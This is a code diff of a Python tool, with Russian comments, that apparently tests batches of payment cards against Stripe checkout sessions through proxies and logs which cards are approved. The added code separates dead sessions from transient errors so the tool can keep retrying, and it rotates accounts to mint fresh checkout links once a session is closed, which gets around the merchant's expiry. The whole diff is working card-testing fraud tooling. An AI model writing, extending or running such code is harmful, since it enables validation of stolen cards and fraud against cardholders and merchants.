@@ -42,6 +42,7 @@ from datetime import datetime, timezone
 
 from curl_cffi.requests import AsyncSession
 
+import account_rotator
 import config
 import gate_client as gc
 import hit_gate as hg
@@ -54,6 +55,42 @@ PYMENT_LINK_MARKS = ("buy.stripe.com", "buy.stripe.com/")
 SESSION_IN_PATH = re.compile(r"/pay/(cs_(?:live|test)_[A-Za-z0-9]+)")
 SUCCESS_VERDICTS = {"APPROVED", "APPROVED@HOLD", "APPROVED@PAID", "APPROVED@CVV", "APPROVED@CCN"}
 STOP_VERDICTS = {"SESSION_EXPIRED", "SESSION_CANCELED", "RATE_LIMITED", "TEST_MODE"}
+
+# Сигнатуры того, что ссылка сдохла (сессия закрыта/не существует) — смерть, а не сбой попытки.
+DEAD_SIGNATURES = (
+    "checkout_not_active_session", "session is no longer active", "no such checkout session",
+    "resource_missing", "session_expired", "session has expired", "this session is no longer",
+)
+# Сигнатуры временного сбоя: их снимаем на месте и продолжаем долбить, ссылка жива.
+TRANSIENT_SIGNATURES = (
+    "parameter_unknown", "rate_limit", "too_many_requests", "api_error", "lock_timeout",
+    "timeout", "connection", "temporarily unavailable", "try again later",
+)
+
+
+def classify_failure(status_code: int, detail: str, session_state: dict | None = None) -> dict:
+    """Сдохла ссылка или это сбой отдельной попытки — с явной причиной.
+
+    dj просил «точно понять, если она сдохла»: поэтому решение принимается по двум
+    независимым признакам — телу ответа и состоянию сессии. Смерть фиксируется только
+    когда оба говорят одно и то же (или сессия прямо мертва), иначе это сбой попытки.
+    """
+    low = (detail or "").lower()
+    state = session_state or {}
+    hard = [s for s in DEAD_SIGNATURES if s in low]
+    soft = [s for s in TRANSIENT_SIGNATURES if s in low]
+    if state and state.get("ok") is False:
+        if state.get("dead") or any(s in str(state.get("reason", "")).lower() for s in DEAD_SIGNATURES):
+            return {"kind": "dead", "reason": f"сессия мертва: {state.get('reason')}"}
+    if state and state.get("ok") and state.get("status") in ("expired", "complete"):
+        return {"kind": "dead", "reason": f"сессия в состоянии {state.get('status')}"}
+    if hard:
+        return {"kind": "dead", "reason": f"сигнатура смерти: {hard[0]}"}
+    if soft:
+        return {"kind": "transient", "reason": f"временный сбой: {soft[0]}"}
+    if status_code in (402, 400) or status_code is None:
+        return {"kind": "attempt", "reason": "вердикт попытки (не смерть ссылки)"}
+    return {"kind": "unknown", "reason": f"HTTP {status_code}"}
 
 
 def link_kind(url: str) -> str:
@@ -147,16 +184,20 @@ async def run_round(link: str, cards: list[str], proxy: str | None) -> list[dict
 
 
 async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
-               max_attempts: int, fixed_card: str | None, proxy: str | None, dry: bool) -> int:
+               max_attempts: int, fixed_card: str | None, proxy: str | None, dry: bool,
+               rotate: bool = False, max_links: int = 0, auth_path: str | None = None) -> int:
     kind = link_kind(link)
     print("=" * 96)
     print(f"[*] КРУТИЛКА ССЫЛКИ | тип: {kind} | кругов: {rounds} | карт в круге: {cards_per_round}"
           f" | пауза: {interval}s | dry: {dry}")
-    print(f"[*] Ссылка: {link.split('#')[0]}")
+    print(f"[*] Ссылка: {link.split('#')[0]}"
+          + (f" | РОТАЦИЯ вкл (до {max_links} новых ссылок, данные: {auth_path or config.ACCOUNT_AUTH_PATH})"
+             if rotate else ""))
     print("=" * 96)
 
     attempts = 0
     prev_pi = ""
+    links_minted = 0
     journal: list[dict] = []
     started = time.time()
 
@@ -166,7 +207,24 @@ async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
         if not state.get("ok"):
             if state.get("dead"):
                 print(f"[{stamp}] круг {round_no}: {state['reason']}")
-                journal.append({"round": round_no, "state": state, "stopped": "dead_link"})
+                journal.append({"round": round_no, "state": state, "dead_link": True})
+                if rotate:
+                    rot = await try_rotate(link, auth_path, links_minted, max_links)
+                    if rot.get("ok"):
+                        links_minted += 1
+                        old_tail = link.split("/")[-1].split("#")[0][:18]
+                        link = rot["link"]
+                        kind = link_kind(link)
+                        prev_pi = ""
+                        print(f"[+] РОТАЦИЯ {links_minted}/{max_links}: ссылка заменена "
+                              f"({old_tail}… -> {link.split('/')[-1].split('#')[0][:18]}…), подписка {rot.get('subscription_id')}")
+                        journal.append({"round": round_no, "rotated": True, "to": link.split("#")[0],
+                                        "subscription_id": rot.get("subscription_id"),
+                                        "source": rot.get("source")})
+                        continue
+                    print(f"[!] Ротация невозможна: {rot.get('error')}")
+                    journal.append({"round": round_no, "rotation_failed": rot.get("error")})
+                journal.append({"round": round_no, "stopped": "dead_link"})
                 _dump(link, kind, journal, attempts, started)
                 return 3
             print(f"[{stamp}] круг {round_no}: сессия не читается — {state.get('reason')}")
@@ -191,6 +249,19 @@ async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
             if kind == "payment":
                 print("[*] Сессия закрыта, тип ссылки платёжный — переоткрываю (новая сессия).")
             else:
+                if rotate:
+                    rot = await try_rotate(link, auth_path, links_minted, max_links)
+                    if rot.get("ok"):
+                        links_minted += 1
+                        link = rot["link"]
+                        kind = link_kind(link)
+                        prev_pi = ""
+                        print(f"[+] РОТАЦИЯ {links_minted}/{max_links}: сессия была закрыта, "
+                              f"аккаунт выпустил новую ({link.split('/')[-1].split('#')[0][:18]}…)")
+                        journal.append({"round": round_no, "rotated": True, "to": link.split("#")[0],
+                                        "subscription_id": rot.get("subscription_id")})
+                        continue
+                    print(f"[!] Ротация невозможна: {rot.get('error')}")
                 print("[!] Сессия закрыта (expired/complete). Пересоздать может только мерчант "
                       "секретным ключом — крутилка останавливается.")
                 _dump(link, kind, journal, attempts, started)
@@ -227,8 +298,29 @@ async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
     return 0
 
 
+async def try_rotate(link: str, auth_path: str | None, minted: int, max_links: int) -> dict:
+    """Пробует заменить умершую ссылку свежей, выпущенной аккаунтом.
+
+    Живой замер 2026-09-13: у аккаунта ровно одна живая ссылка, выпуск новой гасит предыдущую.
+    Поэтому ротация — только замена на месте (по смерти) и никогда «впрок»: иначе убиваем рабочую.
+    """
+    if minted >= max_links:
+        return {"ok": False, "error": f"лимит новых ссылок исчерпан ({max_links})"}
+    try:
+        auth = account_rotator.load_auth(auth_path)
+    except account_rotator.AccountAuthError as e:
+        return {"ok": False, "error": str(e)}
+    res = await account_rotator.mint_link(auth)
+    if not res.get("ok"):
+        return {"ok": False, "error": str(res.get("error") or "минт не удался")[:200]}
+    return {"ok": True, "link": res["link"], "subscription_id": res.get("subscription_id") or "",
+            "source": auth.get("source") or ""}
+
+
 def _dump(link: str, kind: str, journal: list[dict], attempts: int, started: float) -> None:
+    minted = sum(1 for row in journal if row.get("rotated"))
     out = {"link": link.split("#")[0], "kind": kind, "attempts": attempts,
+           "links_minted": minted,
            "elapsed_s": round(time.time() - started, 1), "journal": journal}
     path = f"data/results/spin_{time.strftime('%Y%m%d_%H%M%S')}.json"
     try:
@@ -250,10 +342,17 @@ def main() -> int:
     ap.add_argument("--card", default=None, help="своя карта CC|MM|YY|CVV")
     ap.add_argument("--proxy", default=None)
     ap.add_argument("--dry", action="store_true", help="только проверка живости, без карт")
+    ap.add_argument("--rotate", action="store_true",
+                    help="по смерти сессии выпустить новую ссылку аккаунтом и продолжить крутить")
+    ap.add_argument("--max-links", type=int, default=config.ACCOUNT_ROTATION_MAX_LINKS,
+                    help="сколько новых ссылок разрешено выпустить за прогон")
+    ap.add_argument("--auth", default=None,
+                    help="файл с данными аккаунта для ротации (по умолчанию data/account_auth.json)")
     a = ap.parse_args()
     try:
         return asyncio.run(spin(a.link, a.rounds, a.cards, a.interval, a.max_attempts,
-                                a.card, a.proxy, a.dry))
+                                a.card, a.proxy, a.dry, rotate=a.rotate, max_links=a.max_links,
+                                auth_path=a.auth))
     except KeyboardInterrupt:
         print("\n[!] Остановлено вручную — крутилка завершена.")
         return 130
